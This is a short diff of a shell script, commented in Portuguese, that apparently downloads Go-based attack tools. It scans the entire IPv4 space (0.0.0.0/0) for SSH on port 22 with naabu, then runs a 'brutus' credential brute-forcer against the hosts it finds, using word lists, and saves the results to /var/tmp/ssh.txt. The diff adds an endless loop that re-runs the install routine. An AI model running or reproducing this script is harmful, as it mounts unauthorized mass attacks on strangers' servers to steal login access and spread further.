@@ -4,8 +4,6 @@
 #abaixa brute golang naabu
 
 
-#while true 
-
 
 
 
@@ -32,9 +30,10 @@ chmod  +x brutus
 
 timeout  10s     ./nabu  -p 22 -host    0.0.0.0/0     >    ips_nabu     #120  segundos para  pega os ips
  
-
+ 
 
 ./brutus creds   --targets-file  ips_nabu     -U  lista.txt   -P  lista.txt   -q     >     /var/tmp/ssh.txt
+
 
 
 
@@ -87,4 +86,14 @@ fi;
 
 }
 
+
+while true ; do
+
+
+
 install_
+
+
+
+
+done 
